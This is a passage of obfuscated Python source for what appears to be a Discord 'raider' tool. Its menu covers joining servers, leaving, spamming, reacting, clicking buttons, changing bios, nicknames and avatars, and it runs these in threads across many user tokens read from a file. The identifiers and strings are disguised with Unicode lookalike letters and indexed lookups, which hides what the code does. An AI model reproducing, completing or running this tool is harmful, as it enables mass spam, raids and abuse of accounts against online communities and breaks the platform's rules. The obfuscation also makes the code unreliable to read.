        𝘫𝘀𝙤𝗻_𝘥𝗮𝙩𝙖 = {𝘔𝘔𝙉𝗜𝙈𝗜𝙈𝙄𝘭𝘔𝗡𝗡𝘔𝗡𝙡𝗠𝗠𝗹𝘔𝘐𝗹𝙄𝘕𝗜𝘕𝗡𝙄𝗠𝙉𝙉𝗜𝗹[305]: 3, 𝗠𝗠𝗡𝗜𝙈𝗜𝙈𝙄𝙡𝙈𝗡𝘕𝙈𝗡𝙡𝗠𝗠𝗹𝙈𝗜𝙡𝙄𝘕𝘐𝙉𝙉𝙄𝗠𝙉𝗡𝙄𝗹[330]: 𝗠𝗠𝘕𝘐𝙈𝗜𝗠𝗜𝗹𝙈𝗡𝗡𝗠𝘕𝙡𝙈𝘔𝘭𝗠𝙄𝗹𝙄𝗡𝗜𝘕𝙉𝙄𝙈𝘕𝘕𝘐𝙡[22], 𝙈𝙈𝙉𝙄𝗠𝙄𝙈𝗜𝙡𝙈𝙉𝘕𝗠𝘕𝗹𝗠𝗠𝙡𝙈𝙄𝙡𝘐𝙉𝘐𝘕𝗡𝘐𝙈𝗡𝗡𝙄𝘭[161]: 𝗴𝙪𝙞𝘭𝙙_𝙞𝙙, 𝗠𝙈𝙉𝘐𝘔𝘐𝗠𝗜𝗹𝘔𝘕𝗡𝘔𝙉𝙡𝘔𝗠𝙡𝗠𝘐𝙡𝘐𝙉𝗜𝗡𝗡𝙄𝗠𝙉𝙉𝙄𝗹[261]: 𝗰𝘩𝗮𝙣𝘯𝙚𝙡_𝗶𝙙, 𝙈𝗠𝘕𝗜𝙈𝗜𝗠𝘐𝘭𝘔𝘕𝙉𝘔𝘕𝗹𝗠𝗠𝗹𝗠𝗜𝗹𝘐𝘕𝗜𝙉𝗡𝙄𝘔𝙉𝗡𝗜𝗹[331]: 0, 𝘔𝗠𝗡𝙄𝘔𝙄𝘔𝙄𝗹𝘔𝗡𝘕𝗠𝘕𝗹𝙈𝘔𝗹𝗠𝙄𝗹𝗜𝘕𝗜𝗡𝙉𝙄𝘔𝘕𝗡𝘐𝗹[332]: 𝘮𝗲𝘀𝘴𝘢𝗴𝗲_𝙞𝙙, 𝘔𝙈𝘕𝙄𝘔𝘐𝗠𝙄𝙡𝗠𝗡𝙉𝗠𝗡𝗹𝙈𝗠𝗹𝗠𝗜𝗹𝙄𝘕𝗜𝙉𝘕𝙄𝗠𝙉𝙉𝙄𝙡[333]: 𝙢𝙚𝘀𝘀𝙖𝘨𝗲𝗯𝗼𝘵𝙩𝙤𝗰𝙡𝙞𝗰𝗸[𝙈𝘔𝙉𝘐𝙈𝙄𝘔𝘐𝘭𝘔𝙉𝗡𝘔𝘕𝘭𝙈𝗠𝙡𝘔𝗜𝗹𝘐𝘕𝗜𝘕𝙉𝘐𝙈𝙉𝘕𝘐𝘭[334]][𝘔𝘔𝗡𝙄𝙈𝙄𝗠𝗜𝗹𝘔𝙉𝙉𝙈𝙉𝗹𝙈𝙈𝗹𝗠𝙄𝗹𝙄𝘕𝗜𝙉𝙉𝗜𝘔𝘕𝗡𝘐𝘭[160]], 𝙈𝘔𝙉𝙄𝗠𝙄𝘔𝘐𝙡𝗠𝗡𝘕𝙈𝙉𝘭𝗠𝙈𝘭𝘔𝘐𝘭𝗜𝗡𝙄𝘕𝘕𝘐𝘔𝗡𝙉𝗜𝙡[141]: 𝘶𝙪𝘪𝘥.uuid4().hex, 𝘔𝗠𝙉𝘐𝙈𝘐𝙈𝘐𝘭𝗠𝗡𝙉𝘔𝘕𝗹𝘔𝗠𝙡𝙈𝙄𝗹𝙄𝘕𝗜𝗡𝘕𝘐𝘔𝙉𝗡𝗜𝙡[17]: {𝙈𝘔𝘕𝙄𝙈𝗜𝘔𝗜𝗹𝗠𝙉𝙉𝙈𝘕𝗹𝘔𝙈𝙡𝘔𝘐𝗹𝘐𝗡𝘐𝘕𝘕𝗜𝙈𝗡𝘕𝘐𝗹[335]: 2, 𝗠𝙈𝗡𝙄𝙈𝗜𝗠𝘐𝙡𝘔𝗡𝙉𝙈𝘕𝗹𝙈𝘔𝘭𝗠𝗜𝗹𝗜𝙉𝘐𝗡𝘕𝗜𝗠𝙉𝘕𝗜𝗹[336]: 𝗯𝘶𝘁𝘵𝙤𝙣𝘴[𝙫𝙍𝘚𝙥𝘢𝗯𝙝𝙈𝘆𝙭18𝘬𝘏𝙮1𝘌𝘯𝙅𝙖𝘇𝗥𝘎𝙒𝙤𝘖𝙜𝘳6𝙉6𝗞.mro()[10](𝘰𝙥𝙩𝘪𝗼𝘯𝗯𝙪𝙩𝘵𝗼𝘯)][𝘔𝙈𝙉𝗜𝙈𝙄𝘔𝙄𝘭𝙈𝗡𝙉𝗠𝙉𝗹𝘔𝗠𝘭𝗠𝘐𝙡𝗜𝗡𝗜𝙉𝙉𝗜𝗠𝙉𝙉𝙄𝘭[336]]}}
        𝘳𝗿 = 𝘳𝙚𝙦𝘂𝙚𝘴𝘁𝘴.post(𝘔𝘔𝗡𝗜𝙈𝘐𝘔𝘐𝘭𝘔𝙉𝙉𝙈𝘕𝘭𝗠𝙈𝗹𝘔𝙄𝗹𝗜𝙉𝙄𝗡𝗡𝘐𝘔𝘕𝙉𝗜𝘭[337], headers=𝘩𝗲𝙖𝘥𝙚𝗿𝙨, json=𝘫𝘴𝗼𝙣_𝘥𝙖𝙩𝙖)
    except:
        𝘱𝙧𝗶𝙣𝙩(f"{𝗿}{𝙈𝗠𝗡𝙄𝘔𝙄𝙈𝗜𝘭𝗠𝘕𝙉𝘔𝙉𝙡𝘔𝗠𝗹𝗠𝗜𝙡𝙄𝘕𝘐𝙉𝘕𝗜𝗠𝙉𝗡𝘐𝗹[91]}{𝗱𝘢𝙩𝘦𝘁𝘪𝘮𝘦.datetime.now().strftime(f'{𝘨}{𝗠𝗠𝙉𝗜𝗠𝘐𝙈𝙄𝙡𝙈𝗡𝙉𝘔𝘕𝗹𝘔𝘔𝘭𝗠𝘐𝙡𝘐𝙉𝘐𝙉𝘕𝗜𝗠𝘕𝗡𝙄𝘭[92]}{𝘳}')}{𝘔𝗠𝘕𝗜𝗠𝘐𝙈𝘐𝘭𝘔𝘕𝙉𝘔𝗡𝙡𝘔𝙈𝙡𝗠𝙄𝙡𝗜𝙉𝘐𝗡𝘕𝙄𝗠𝘕𝙉𝗜𝘭[93]}{𝗿}{𝗠𝗠𝗡𝘐𝗠𝗜𝗠𝗜𝘭𝗠𝗡𝗡𝘔𝗡𝘭𝘔𝙈𝘭𝗠𝙄𝘭𝙄𝗡𝙄𝙉𝘕𝘐𝙈𝘕𝘕𝙄𝗹[91]}{𝙗}{𝘔𝙈𝙉𝘐𝙈𝗜𝗠𝗜𝙡𝘔𝘕𝙉𝙈𝙉𝘭𝙈𝗠𝙡𝘔𝙄𝘭𝙄𝙉𝗜𝘕𝘕𝘐𝗠𝙉𝗡𝘐𝙡[314]}{𝙧}{𝙈𝗠𝘕𝗜𝘔𝙄𝗠𝙄𝘭𝗠𝗡𝙉𝘔𝗡𝗹𝘔𝗠𝗹𝗠𝗜𝗹𝗜𝙉𝘐𝘕𝗡𝗜𝗠𝗡𝙉𝗜𝙡[93]}{𝙣𝙣}{𝗠𝙈𝘕𝘐𝗠𝘐𝙈𝘐𝙡𝘔𝗡𝙉𝙈𝙉𝘭𝙈𝘔𝙡𝗠𝙄𝗹𝙄𝙉𝗜𝙉𝘕𝘐𝘔𝘕𝗡𝙄𝗹[270]}{𝙧𝗿.text}")

class Menu:

    def __init__(self):
        𝘴𝘦𝙩𝗮𝙩𝙩𝙧(𝘴𝗲𝘭𝗳, 'raider', 𝙍𝘢𝗶𝗱𝙚𝗿())
        𝘀𝗲𝘵𝙖𝘁𝘵𝙧(𝘴𝙚𝘭𝗳, 'options', {𝗠𝗠𝘕𝘐𝘔𝗜𝗠𝘐𝘭𝗠𝘕𝙉𝙈𝙉𝘭𝙈𝗠𝘭𝙈𝘐𝙡𝘐𝘕𝙄𝗡𝙉𝘐𝗠𝙉𝘕𝗜𝙡[338]: 𝘀𝙚𝘭𝙛.joiner, 𝘔𝘔𝗡𝙄𝗠𝗜𝗠𝗜𝘭𝙈𝙉𝗡𝗠𝘕𝙡𝙈𝘔𝘭𝗠𝙄𝘭𝘐𝘕𝗜𝘕𝗡𝗜𝙈𝙉𝗡𝗜𝘭[339]: 𝘀𝗲𝘭𝙛.leaver, 𝙈𝘔𝗡𝙄𝗠𝗜𝗠𝘐𝘭𝘔𝘕𝗡𝗠𝗡𝘭𝗠𝗠𝘭𝘔𝗜𝘭𝘐𝘕𝘐𝘕𝘕𝘐𝗠𝗡𝘕𝙄𝘭[340]: 𝘀𝗲𝘭𝙛.spammer, 𝙈𝘔𝗡𝙄𝙈𝙄𝘔𝘐𝘭𝘔𝙉𝘕𝗠𝗡𝙡𝗠𝙈𝙡𝘔𝘐𝙡𝗜𝗡𝗜𝗡𝘕𝘐𝘔𝘕𝘕𝘐𝙡[341]: 𝘀𝙚𝘭𝗳.Checker, 𝘔𝘔𝗡𝙄𝘔𝘐𝙈𝙄𝘭𝘔𝗡𝗡𝗠𝗡𝗹𝙈𝙈𝙡𝘔𝗜𝙡𝙄𝗡𝘐𝗡𝘕𝗜𝙈𝙉𝗡𝘐𝗹[342]: 𝘀𝗲𝗹𝗳.reactor, 𝘔𝗠𝘕𝘐𝗠𝗜𝘔𝙄𝗹𝘔𝘕𝙉𝙈𝘕𝙡𝙈𝙈𝘭𝘔𝙄𝘭𝗜𝙉𝗜𝘕𝘕𝘐𝗠𝗡𝙉𝙄𝘭[343]: 𝘴𝗲𝙡𝗳.formater, 𝘔𝘔𝘕𝘐𝗠𝘐𝙈𝘐𝘭𝙈𝗡𝙉𝙈𝘕𝙡𝗠𝗠𝙡𝘔𝘐𝗹𝗜𝗡𝙄𝗡𝗡𝘐𝙈𝙉𝘕𝗜𝙡[344]: 𝙨𝘦𝘭𝘧.button_click, 𝙈𝘔𝗡𝗜𝙈𝘐𝙈𝗜𝗹𝘔𝘕𝗡𝗠𝘕𝗹𝗠𝙈𝙡𝘔𝙄𝙡𝗜𝗡𝙄𝙉𝗡𝘐𝗠𝙉𝘕𝗜𝙡[345]: 𝘀𝙚𝙡𝙛.accept_rules, 𝗠𝗠𝙉𝙄𝙈𝙄𝘔𝘐𝗹𝙈𝗡𝘕𝙈𝗡𝙡𝙈𝗠𝙡𝙈𝙄𝘭𝘐𝙉𝙄𝙉𝗡𝙄𝘔𝗡𝗡𝙄𝗹[346]: 𝘀𝘦𝘭𝗳.Check_guild, 𝗠𝙈𝗡𝙄𝙈𝙄𝗠𝘐𝘭𝗠𝘕𝙉𝗠𝘕𝙡𝗠𝙈𝗹𝘔𝘐𝗹𝙄𝗡𝗜𝗡𝗡𝗜𝘔𝙉𝗡𝗜𝘭[288]: 𝙨𝗲𝘭𝙛.Change_bio, 𝗠𝙈𝙉𝘐𝘔𝙄𝗠𝘐𝙡𝙈𝙉𝙉𝗠𝘕𝗹𝙈𝙈𝙡𝙈𝘐𝗹𝘐𝙉𝙄𝗡𝙉𝘐𝗠𝗡𝘕𝘐𝗹[347]: 𝙨𝙚𝘭𝘧.Oneliner, 𝙈𝗠𝙉𝙄𝗠𝘐𝙈𝙄𝗹𝗠𝙉𝘕𝗠𝗡𝙡𝗠𝙈𝙡𝘔𝗜𝗹𝙄𝙉𝙄𝘕𝘕𝘐𝙈𝘕𝗡𝘐𝘭[348]: 𝘀𝙚𝗹𝙛.voicejoiner, 𝘔𝙈𝗡𝘐𝙈𝗜𝗠𝙄𝘭𝘔𝗡𝗡𝗠𝗡𝗹𝗠𝘔𝗹𝘔𝗜𝙡𝗜𝘕𝙄𝘕𝘕𝙄𝙈𝘕𝘕𝗜𝙡[349]: 𝘀𝗲𝘭𝗳.Nick, 𝘔𝙈𝗡𝙄𝗠𝗜𝗠𝙄𝘭𝘔𝙉𝗡𝘔𝙉𝗹𝘔𝘔𝗹𝗠𝘐𝙡𝗜𝙉𝘐𝘕𝘕𝘐𝗠𝗡𝗡𝗜𝙡[350]: 𝘴𝘦𝙡𝘧.thread, 𝘔𝗠𝗡𝙄𝗠𝙄𝙈𝘐𝙡𝙈𝗡𝗡𝙈𝗡𝗹𝙈𝘔𝘭𝘔𝘐𝗹𝘐𝙉𝙄𝙉𝘕𝙄𝗠𝗡𝙉𝗜𝙡[351]: 𝘀𝗲𝙡𝗳.forms, 𝗠𝙈𝙉𝘐𝘔𝙄𝗠𝗜𝘭𝘔𝘕𝘕𝘔𝗡𝘭𝙈𝘔𝘭𝙈𝗜𝗹𝘐𝗡𝙄𝗡𝘕𝙄𝘔𝘕𝘕𝗜𝗹[352]: 𝘴𝘦𝙡𝗳.avatar, 𝗠𝘔𝗡𝙄𝙈𝗜𝘔𝙄𝘭𝗠𝗡𝗡𝙈𝙉𝙡𝘔𝘔𝘭𝗠𝗜𝗹𝙄𝘕𝙄𝘕𝗡𝗜𝗠𝘕𝙉𝘐𝘭[353]: 𝘀𝘦𝙡𝘧.exit})

    def main_menu(self):
        𝗰𝙤𝘯𝙨𝗼𝗹𝗲.run()
        𝗰𝗵𝙤𝘪𝙘𝗲 = 𝘪𝗻𝗽𝘶𝘵(f'{𝗠𝘔𝗡𝘐𝘔𝗜𝘔𝙄𝙡𝙈𝙉𝗡𝘔𝙉𝘭𝗠𝙈𝘭𝘔𝗜𝗹𝙄𝙉𝘐𝗡𝗡𝙄𝙈𝗡𝙉𝙄𝙡[354]}{𝘳}{𝘔𝗠𝗡𝗜𝗠𝘐𝙈𝘐𝙡𝘔𝗡𝘕𝘔𝙉𝗹𝙈𝙈𝙡𝙈𝘐𝙡𝙄𝙉𝗜𝙉𝙉𝘐𝗠𝘕𝙉𝗜𝗹[91]}{𝗹𝘤}{𝙈𝘔𝘕𝙄𝙈𝙄𝘔𝙄𝗹𝗠𝘕𝘕𝗠𝙉𝙡𝘔𝗠𝗹𝗠𝗜𝙡𝗜𝙉𝘐𝗡𝘕𝗜𝙈𝗡𝙉𝗜𝙡[355]}{𝘳}{𝙈𝘔𝗡𝘐𝙈𝙄𝗠𝗜𝘭𝙈𝘕𝗡𝘔𝙉𝗹𝗠𝘔𝙡𝙈𝘐𝘭𝙄𝘕𝘐𝘕𝙉𝗜𝗠𝘕𝗡𝘐𝗹[157]}{𝗴}{𝘳}{𝘔𝗠𝗡𝗜𝗠𝗜𝘔𝙄𝙡𝘔𝘕𝗡𝗠𝘕𝙡𝗠𝘔𝗹𝙈𝙄𝙡𝗜𝙉𝘐𝘕𝙉𝙄𝗠𝙉𝘕𝙄𝗹[98]}')
        if 𝗰𝘩𝘰𝘪𝘤𝘦 in 𝘀𝗲𝗹𝙛.options:
            𝘀𝘦𝙡𝘧.options[𝙘𝘩𝗼𝗶𝗰𝘦]()
        else:
            𝘴𝘦𝘭𝙛.main_menu()

    def run(self, func, args):
        𝙩𝗵𝙧𝙚𝘢𝗱𝘀 = []
        𝙘𝘰𝗻𝙨𝘰𝘭𝙚.render_ascii()
        for 𝗮𝙧𝙜 in 𝙖𝘳𝗴𝘴:
            𝙩𝙝𝗿𝗲𝙖𝗱 = 𝙩𝘩𝘳𝗲𝙖𝙙𝘪𝗻𝗴.Thread(target=𝙛𝘶𝙣𝗰, args=𝙖𝘳𝗴)
            𝙩𝗵𝙧𝗲𝘢𝘥𝘴.append(𝘁𝗵𝘳𝗲𝘢𝙙)
            𝘵𝘩𝘳𝙚𝗮𝙙.start()
        for 𝙩𝘩𝙧𝙚𝗮𝙙 in 𝘁𝙝𝗿𝗲𝙖𝙙𝘀:
            𝙩𝘩𝗿𝗲𝙖𝗱.join()
        𝘱𝘳𝘪𝗻𝘁(𝘔𝗠𝙉𝗜𝗠𝙄𝘔𝘐𝗹𝙈𝘕𝗡𝗠𝗡𝙡𝘔𝙈𝘭𝘔𝗜𝙡𝗜𝘕𝗜𝙉𝘕𝙄𝘔𝗡𝙉𝙄𝗹[356])
        𝘰𝘀.system(𝘔𝙈𝗡𝙄𝙈𝘐𝙈𝙄𝗹𝘔𝗡𝗡𝙈𝙉𝗹𝙈𝗠𝘭𝘔𝘐𝘭𝗜𝙉𝗜𝘕𝗡𝗜𝙈𝗡𝙉𝙄𝙡[357])
        𝘀𝙚𝗹𝘧.main_menu()

    @𝘄𝗿𝙖𝗽𝙥𝘦𝙧
    def avatar(self):
        𝙤𝙨.system(𝘔𝘔𝘕𝘐𝙈𝘐𝗠𝗜𝙡𝗠𝘕𝙉𝘔𝗡𝙡𝙈𝗠𝙡𝙈𝗜𝘭𝙄𝘕𝗜𝗡𝘕𝙄𝗠𝙉𝗡𝙄𝘭[358])
        𝙤𝘴.system(𝗠𝘔𝙉𝙄𝗠𝙄𝙈𝗜𝗹𝗠𝙉𝙉𝙈𝗡𝙡𝗠𝙈𝗹𝘔𝙄𝘭𝘐𝘕𝘐𝙉𝘕𝗜𝙈𝘕𝗡𝗜𝗹[1])
        𝗽𝘳𝗶𝗻𝙩(𝗺𝘦𝘯𝘶)
        for 𝘁𝘰𝗸𝘦𝗻 in 𝘵𝘰𝙠𝘦𝘯𝙨:
            𝙩𝙝𝗿𝙚𝗮𝙙𝘪𝘯𝗴.Thread(target=𝙖𝘃𝗮𝘵𝙖𝗿_𝘤𝘩𝗮𝙣𝗴𝘦𝙧, args=𝙩𝘰𝙠𝘦𝘯).start()
        𝘦𝘹𝙞𝘁 = 𝙞𝘯𝗽𝘶𝘁(𝙈𝙈𝘕𝘐𝗠𝗜𝘔𝙄𝙡𝗠𝙉𝘕𝘔𝗡𝙡𝘔𝙈𝙡𝘔𝘐𝘭𝗜𝙉𝘐𝗡𝙉𝙄𝗠𝙉𝙉𝗜𝘭[22])
        𝘦𝘹𝙞𝘁 = 𝗠𝗲𝗻𝘂().main_menu()
        𝘦𝘅𝙞𝘵()

    @𝘄𝗿𝗮𝘱𝗽𝙚𝙧
    def formater(self):
        𝙤𝘀.system(𝙈𝘔𝙉𝙄𝘔𝙄𝘔𝗜𝗹𝙈𝘕𝘕𝘔𝙉𝙡𝗠𝗠𝗹𝘔𝗜𝗹𝘐𝙉𝗜𝘕𝙉𝘐𝙈𝙉𝙉𝗜𝗹[359])
        try:
            𝗰𝗹𝗲𝙖𝘯 = []
            𝘰𝙨.system(𝘔𝗠𝗡𝘐𝙈𝘐𝘔𝘐𝘭𝘔𝙉𝙉𝙈𝗡𝘭𝙈𝙈𝙡𝙈𝘐𝗹𝙄𝙉𝗜𝙉𝘕𝘐𝗠𝙉𝘕𝘐𝘭[1])
            𝗽𝘳𝙞𝗻𝙩(𝗺𝘦𝗻𝘂)
            with 𝗼𝗽𝘦𝗻(𝙈𝙈𝙉𝙄𝗠𝙄𝗠𝗜𝘭𝗠𝙉𝘕𝙈𝘕𝗹𝗠𝙈𝗹𝙈𝗜𝙡𝙄𝘕𝙄𝗡𝙉𝗜𝘔𝙉𝗡𝗜𝙡[59], 𝗠𝗠𝘕𝘐𝘔𝘐𝗠𝙄𝘭𝗠𝙉𝘕𝗠𝙉𝙡𝘔𝙈𝗹𝘔𝘐𝘭𝘐𝙉𝗜𝙉𝗡𝙄𝗠𝘕𝘕𝙄𝗹[30]) as 𝙛:
                𝙡𝗶𝘯𝗲𝘴 = 𝙛.read().splitlines()
                for 𝘭𝗶𝙣𝘦 in 𝙡𝘪𝘯𝙚𝘴:
                    𝘀𝙥𝙡𝘪𝙩 = 𝙡𝙞𝙣𝙚.split(𝙈𝘔𝘕𝙄𝘔𝙄𝙈𝘐𝙡𝗠𝙉𝘕𝗠𝘕𝗹𝙈𝗠𝘭𝘔𝘐𝙡𝙄𝗡𝘐𝘕𝙉𝘐𝗠𝘕𝙉𝗜𝗹[360])
                    𝘤𝙡𝗲𝗮𝘯.append(𝙨𝘱𝘭𝘪𝙩[2])
            with 𝙤𝙥𝙚𝗻(𝘔𝗠𝘕𝗜𝗠𝙄𝙈𝗜𝘭𝘔𝘕𝙉𝙈𝙉𝙡𝙈𝙈𝗹𝘔𝙄𝗹𝙄𝗡𝘐𝙉𝗡𝗜𝗠𝘕𝙉𝗜𝗹[59], 𝙈𝗠𝗡𝘐𝙈𝘐𝗠𝗜𝘭𝘔𝘕𝘕𝗠𝘕𝙡𝘔𝙈𝙡𝗠𝘐𝗹𝙄𝗡𝙄𝙉𝗡𝗜𝙈𝗡𝙉𝙄𝙡[21]) as 𝘧:
                for 𝘵𝘰𝙠𝘦𝙣 in 𝗰𝙡𝙚𝘢𝗻:
                    𝗳.write(f'{𝘁𝙤𝙠𝙚𝙣}{𝘔𝙈𝗡𝗜𝙈𝘐𝘔𝙄𝘭𝙈𝙉𝙉𝘔𝙉𝙡𝗠𝗠𝗹𝙈𝗜𝘭𝗜𝘕𝙄𝗡𝗡𝘐𝗠𝙉𝘕𝗜𝙡[63]}')
            𝙥𝗿𝘪𝗻𝘵(f'{𝙧}{𝘔𝘔𝗡𝗜𝗠𝗜𝘔𝙄𝘭𝙈𝙉𝗡𝘔𝗡𝘭𝗠𝘔𝗹𝘔𝙄𝗹𝙄𝗡𝗜𝘕𝗡𝗜𝙈𝙉𝙉𝘐𝙡[91]}{𝙡𝗰}{𝙈𝙈𝙉𝘐𝗠𝙄𝗠𝙄𝙡𝗠𝘕𝘕𝘔𝗡𝙡𝗠𝘔𝙡𝙈𝘐𝘭𝗜𝘕𝗜𝙉𝘕𝘐𝘔𝘕𝗡𝘐𝘭[361]}{𝘳}{𝗠𝙈𝘕𝗜𝗠𝘐𝗠𝙄𝘭𝘔𝘕𝘕𝗠𝗡𝘭𝘔𝙈𝘭𝙈𝘐𝙡𝘐𝗡𝙄𝙉𝘕𝙄𝗠𝙉𝗡𝗜𝙡[362]}{𝘭𝙘}{𝙡𝘦𝗻(𝘁𝙤𝗸𝙚𝙣𝘴)}{𝙧}{𝗠𝗠𝙉𝙄𝗠𝘐𝘔𝗜𝙡𝘔𝘕𝙉𝘔𝗡𝙡𝗠𝗠𝘭𝙈𝘐𝗹𝘐𝘕𝙄𝙉𝗡𝗜𝘔𝙉𝗡𝙄𝘭[363]}')
        except:
            pass
        𝙚𝙭𝘪𝙩 = 𝘪𝙣𝗽𝘂𝘵(𝙈𝗠𝙉𝙄𝙈𝘐𝘔𝗜𝙡𝘔𝘕𝘕𝘔𝗡𝗹𝙈𝘔𝙡𝙈𝘐𝙡𝘐𝗡𝘐𝘕𝙉𝙄𝗠𝙉𝙉𝙄𝗹[22])
        𝗲𝘅𝙞𝘁 = 𝙈𝗲𝙣𝘂().main_menu()
        𝗲𝘅𝙞𝘵()

    @𝘸𝙧𝘢𝗽𝗽𝗲𝗿
    def button_click(self):
        𝗼𝙨.system(𝘔𝘔𝘕𝙄𝗠𝗜𝗠𝙄𝘭𝗠𝙉𝗡𝙈𝗡𝙡𝙈𝘔𝙡𝘔𝘐𝘭𝗜𝘕𝗜𝘕𝗡𝗜𝙈𝗡𝘕𝗜𝙡[90])
        𝗺𝙚𝘀𝘴𝘢𝗴𝙚𝙡𝗶𝘯𝗸 = 𝗶𝙣𝗽𝘶𝘁(f'{𝗿}{𝘔𝗠𝗡𝘐𝙈𝗜𝙈𝗜𝗹𝘔𝗡𝙉𝙈𝘕𝙡𝘔𝙈𝙡𝙈𝗜𝙡𝗜𝗡𝗜𝘕𝗡𝘐𝗠𝘕𝙉𝙄𝗹[91]}{𝘭𝘤}{𝘔𝘔𝘕𝘐𝘔𝘐𝗠𝘐𝙡𝘔𝗡𝗡𝗠𝙉𝘭𝘔𝙈𝗹𝙈𝙄𝗹𝙄𝗡𝗜𝘕𝘕𝙄𝙈𝘕𝘕𝙄𝘭[364]}{𝙧}{𝗠𝘔𝘕𝗜𝗠𝘐𝘔𝙄𝙡𝙈𝗡𝘕𝗠𝙉𝗹𝘔𝘔𝙡𝙈𝙄𝙡𝙄𝘕𝗜𝗡𝘕𝙄𝙈𝘕𝘕𝗜𝗹[365]}')
        𝙥𝗿𝗶𝘯𝙩(f'{𝗿}{𝙈𝘔𝙉𝙄𝘔𝙄𝗠𝘐𝘭𝘔𝘕𝗡𝘔𝘕𝙡𝙈𝙈𝗹𝘔𝘐𝙡𝘐𝘕𝘐𝘕𝙉𝘐𝘔𝙉𝙉𝗜𝗹[366]}{𝙡𝗰}{𝗠𝙈𝙉𝘐𝙈𝗜𝗠𝗜𝘭𝙈𝙉𝙉𝗠𝙉𝗹𝙈𝘔𝙡𝘔𝙄𝘭𝘐𝙉𝗜𝙉𝗡𝘐𝙈𝘕𝗡𝘐𝗹[231]}{𝗿}{𝙈𝘔𝘕𝙄𝗠𝙄𝙈𝗜𝗹𝙈𝗡𝗡𝘔𝙉𝗹𝙈𝗠𝙡𝗠𝗜𝘭𝘐𝘕𝘐𝙉𝙉𝘐𝗠𝘕𝗡𝗜𝙡[367]}')
        𝗯𝘶𝘵𝙩𝗼𝙣𝘰𝘱𝘁𝙞𝗼𝘯 = 𝙞𝗻𝙥𝙪𝙩(f'{𝘳}{𝘔𝙈𝙉𝙄𝙈𝘐𝗠𝗜𝘭𝙈𝙉𝗡𝗠𝗡𝗹𝘔𝗠𝘭𝙈𝙄𝙡𝘐𝗡𝘐𝙉𝘕𝗜𝗠𝗡𝙉𝗜𝗹[91]}{𝙡𝙘}{𝙈𝘔𝙉𝙄𝗠𝗜𝗠𝘐𝙡𝗠𝗡𝗡𝗠𝙉𝗹𝙈𝗠𝘭𝘔𝙄𝙡𝗜𝗡𝗜𝙉𝙉𝙄𝙈𝙉𝙉𝗜𝘭[368]}{𝙧}{𝗠𝗠𝗡𝙄𝙈𝘐𝘔𝗜𝙡𝘔𝘕𝗡𝙈𝗡𝙡𝗠𝗠𝘭𝘔𝗜𝙡𝙄𝙉𝘐𝙉𝙉𝘐𝙈𝙉𝙉𝗜𝙡[365]}')
        𝗼𝘴.system(𝗠𝙈𝘕𝗜𝙈𝗜𝗠𝘐𝗹𝗠𝗡𝘕𝗠𝘕𝘭𝙈𝗠𝗹𝙈𝙄𝗹𝙄𝙉𝙄𝙉𝙉𝗜𝗠𝙉𝘕𝘐𝙡[1])
        𝘱𝗿𝙞𝗻𝘁(𝙢𝗲𝙣𝘂)
        for 𝘁𝗼𝙠𝗲𝗻 in 𝙩𝙤𝙠𝙚𝘯𝘴:
            𝙩𝗵𝙧𝘦𝙖𝘥𝘪𝙣𝗴.Thread(target=𝙗𝙪𝙩𝘁𝘰𝗻_𝙗𝙮𝘱𝙖𝘴𝘀, args=(𝙩𝙤𝙠𝘦𝙣, 𝗺𝗲𝙨𝘴𝗮𝘨𝙚𝘭𝗶𝘯𝙠, 𝘣𝘶𝘁𝘁𝗼𝙣𝘰𝙥𝙩𝙞𝗼𝘯)).start()
        𝗲𝙭𝘪𝘵 = 𝙞𝘯𝘱𝘶𝘁(𝘔𝗠𝘕𝗜𝙈𝘐𝘔𝙄𝙡𝘔𝘕𝘕𝗠𝗡𝗹𝘔𝙈𝙡𝗠𝙄𝗹𝙄𝘕𝘐𝘕𝘕𝘐𝙈𝘕𝗡𝘐𝗹[22])
        𝙚𝙭𝘪𝘁 = 𝘔𝗲𝘯𝙪().main_menu()
        𝘦𝘹𝙞𝙩()

    @𝙬𝗿𝙖𝗽𝘱𝗲𝗿
    def reactor(self):
        𝗼𝙨.system(𝘔𝙈𝘕𝘐𝘔𝗜𝘔𝘐𝙡𝗠𝘕𝘕𝙈𝙉𝙡𝙈𝘔𝘭𝗠𝙄𝙡𝘐𝘕𝘐𝙉𝙉𝗜𝗠𝗡𝗡𝙄𝙡[90])
        𝗺𝙚𝘀𝙨𝗮𝘨𝗲_𝙡𝘪𝙣𝗸 = 𝗶𝘯𝘱𝘶𝙩(f'{𝗿}{𝘔𝙈𝙉𝗜𝙈𝗜𝗠𝙄𝗹𝙈𝙉𝘕𝙈𝗡𝘭𝘔𝘔𝗹𝗠𝗜𝙡𝗜𝘕𝘐𝗡𝙉𝗜𝘔𝗡𝙉𝗜𝗹[91]}{𝘭𝗰}{𝘔𝙈𝙉𝙄𝘔𝗜𝗠𝗜𝙡𝘔𝙉𝘕𝙈𝙉𝘭𝗠𝙈𝗹𝙈𝘐𝙡𝙄𝘕𝘐𝗡𝘕𝘐𝘔𝗡𝗡𝙄𝘭[364]}{𝙧}{𝗠𝗠𝘕𝘐𝗠𝙄𝗠𝗜𝗹𝘔𝘕𝘕𝘔𝗡𝘭𝘔𝙈𝙡𝘔𝘐𝘭𝘐𝗡𝘐𝙉𝙉𝗜𝘔𝗡𝙉𝗜𝘭[365]}')
        if 𝘮𝙚𝘴𝙨𝘢𝘨𝗲_𝗹𝗶𝘯𝙠 == 𝙈𝙈𝘕𝙄𝙈𝗜𝗠𝗜𝗹𝗠𝗡𝗡𝙈𝙉𝙡𝘔𝘔𝘭𝙈𝘐𝘭𝗜𝗡𝙄𝘕𝘕𝙄𝙈𝘕𝗡𝗜𝗹[22]:
            𝗠𝙚𝘯𝘶().main_menu()
        𝘱𝗿𝙞𝗻𝘵(f'{𝗿}{𝙈𝙈𝘕𝘐𝙈𝗜𝘔𝘐𝗹𝗠𝙉𝙉𝙈𝙉𝙡𝗠𝘔𝙡𝘔𝘐𝙡𝗜𝙉𝘐𝙉𝘕𝙄𝙈𝙉𝘕𝘐𝘭[369]}{𝘭𝗰}{𝗠𝘔𝙉𝘐𝙈𝘐𝘔𝗜𝙡𝗠𝙉𝙉𝙈𝘕𝗹𝘔𝗠𝗹𝙈𝗜𝗹𝗜𝙉𝙄𝗡𝙉𝘐𝙈𝘕𝘕𝙄𝗹[231]}{𝙧}{𝗠𝘔𝗡𝗜𝘔𝗜𝘔𝗜𝗹𝗠𝙉𝙉𝗠𝘕𝘭𝘔𝗠𝘭𝙈𝙄𝘭𝘐𝗡𝗜𝙉𝗡𝘐𝘔𝗡𝙉𝘐𝗹[370]}')
